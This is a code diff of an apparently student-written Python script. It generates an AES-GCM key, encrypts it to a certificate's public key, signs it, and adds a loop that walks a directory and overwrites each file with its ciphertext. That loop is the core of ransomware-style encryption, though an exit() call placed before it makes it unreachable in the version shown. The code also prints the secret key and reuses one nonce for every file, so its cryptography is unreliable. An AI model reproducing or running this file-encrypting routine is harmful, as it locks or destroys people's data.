@@ -35,20 +35,20 @@ def parse_args():
   
 def sign_it(enc_AES_key_to_sign, private_signing_key,):  #Noah function
   #if isinstance(private_signing_key, rsa.RSAPrivateKey):
+    print("\n aes signing key \n")
     print(enc_AES_key_to_sign)
     print(private_signing_key)
 
-    signature = private_signing_key.sign(
-        enc_AES_key_to_sign,
-        ec.ECDSA(hashes.SHA256())
-    )
+    signature = private_signing_key.sign(enc_AES_key_to_sign,ec.ECDSA(hashes.SHA256()))
+
     print(signature)
     with open('keyfile.sig','wb') as f:
         f.write(signature)
     #return signature
-      
-      #now we start the signing process
-def encrypt_key(RSA_key, AES_key):   #Noah Function
+
+def encrypt_key(RSA_key, AES_key):
+    print("The actual key")
+    print(AES_key)   #Noah Function
     print(type(AES_key))  
     cipherKey = RSA_key.encrypt(
         AES_key,
@@ -59,7 +59,7 @@ def encrypt_key(RSA_key, AES_key):   #Noah Function
         )
     )
     print("cipher")
-   
+    print(cipherKey)
     return cipherKey
 
 
@@ -77,54 +77,53 @@ if __name__=="__main__":
     x509c = open(pubk,"rb")
     data = x509c.read() 
     key_file = open(prik,"rb")
-    
+    keyfile = open("keyfile","wb")
+
     
     x509c.close()
     
     cert = x509.load_pem_x509_certificate(data,default_backend())
-
-    #with open(prik,'rb') as keyf:
     
-    priv_key = serialization.load_pem_private_key(key_file.read(),password=None, backend=default_backend())
-    
-    #signed_key = sign_it(aes_key,priv_key)
-
-    print(priv_key)
-    print("testing")
-    print(cert.public_key())
-
-    aes_key = b"bily"
-    enc_key = encrypt_key(cert.public_key(),aes_key)
-    signature = sign_it(enc_key, priv_key)
-
-
-    exit()
     for i in cert.subject:
         if i.value != sub:
             print("Incorrect Subject.")
             exit()
     
-    print(cert.public_key())
-
+    priv_key = serialization.load_pem_private_key(key_file.read(),password=None, backend=default_backend())
+    
     key = AESGCM.generate_key(bit_length=128)
-    
-    print(key)
-    
 
+    enc_key = encrypt_key(cert.public_key(),key)
+
+    print("da enc key")
+    print(type(enc_key))
+    print(enc_key)
+    keyfile.write(enc_key)
+    keyfile.close()
+
+    sign_it(enc_key, priv_key)
+
+    exit()
+    
     aesgcm = AESGCM(key)
-
     nonce = os.urandom(11)
-
-	#sign_it()
     
     for subdir, dirs, files in os.walk(Dir):
         for file in files:
             tmp = os.path.join(subdir, file)
             f = open(tmp,'rb')
+            ct = aesgcm.encrypt(nonce,f.read(),None)
+            print(ct)
+            f.close()
+            wf = open(tmp,"wb")
+            wf.write(ct)
+            wf.close()
+    
+        
+
             
-            
-            
-  #key = get_random_bytes(32)
-	#cipher = AES.new(key, AES.MODE_GCM)
-	#ciphertext, tag = cipher.encrypt_and_digest(data)
-            
+    
+    
+        
+    
+
